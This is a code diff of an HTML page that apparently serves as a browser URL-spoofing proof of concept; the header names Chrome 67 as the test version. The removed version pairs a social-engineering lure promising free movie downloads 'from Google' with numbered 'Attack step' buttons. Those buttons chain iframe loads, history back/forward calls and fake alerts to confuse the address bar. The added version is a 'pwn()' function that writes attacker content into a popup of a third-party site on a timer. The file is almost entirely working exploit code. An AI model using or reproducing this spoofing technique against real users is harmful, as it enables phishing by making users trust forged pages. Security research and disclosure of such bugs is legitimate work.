@@ -1,101 +1,25 @@
+
+
 <html>
-
-Download your movie for free and legally from Google! please wait, you will be redirected to Google.<br>
-If a dead link is opened, please go back and you will be redirected to another link. <br><br>
-
-
-
-
-<iframe id="1" src="" onload="" style="display:none;"></iframe>
-
-
-
-
-<button onclick="createiframeschain()">Attack step 1</button>
-
-<button onclick="goback()">Attack step 2</button>
-
-<button onclick="corruptnavigation()">Attack step 3</button>
-
-<button onclick="goforward2times()">Attack step 4</button>
-
-<button onclick="goforward2times()">Attack step 5</button>
-
-<button onclick="goback()">Attack step 6</button>
-
-
-
-
-
+<head>
+<!--
+    author: evi1m0.bat[at]gmail.com
+    test version: Google Chrome 67.0.3396.62
+-->
+</head>
+<body>
 <script>
-
-
-
-function createiframeschain(){
-
-var v=document.getElementById('1');
-v.src='http://www.eurosport.fr';
-
-setTimeout(function(){ v.src='https://fr.wikipedia.org';}, 4000);
-
-setTimeout(function(){ v.src='http://www.eurosport.fr';}, 8000);
-
-setTimeout(function(){ v.src='https://fr.wikipedia.org';}, 12000);
-
-setTimeout(function(){ v.src='http://www.eurosport.fr';}, 16000);
-
-setTimeout(function(){ window.location="https://www.google.com/file_blabla"}, 20000);
-}
-
-
-
-
-function goback(){
-
-window.history.back();
-
-setTimeout(function(){ document.title = "Downloading file";}, 1000);
-
-
-}
-
-
-
-
-function corruptnavigation(){
-
-
-//remove iframes
-var iframes = document.querySelectorAll('iframe');
-for (var i = 0; i < iframes.length; i++) {
-    iframes[i].parentNode.removeChild(iframes[i]);
-}
-
-
-window.history.forward();
-
-
-window.history.forward();
-
-
-alert("redirecting to Google");
-
-
-}
-
-
-function goforward2times(){
-
-window.history.forward();
-window.history.forward();
-
-}
-
-
-
-
+    function pwn() {
+        v = setInterval(`x=window.open('https://jigsaw.w3.org/HTTP/Basic/','test', 'width=400 height=300')`);
+        i = setInterval(`
+            x.document.write("<h1>url spoofing...</h1>");
+            clearInterval(v);
+            clearInterval(i);
+            `, 3333);        
+    }
 </script>
-
-
-
+<li onclick="pwn()">step1: click me</li>
+<li>step2: try use keyboard `command + r`</li>
+<li>step3: xD</li>
+</body>
 </html>
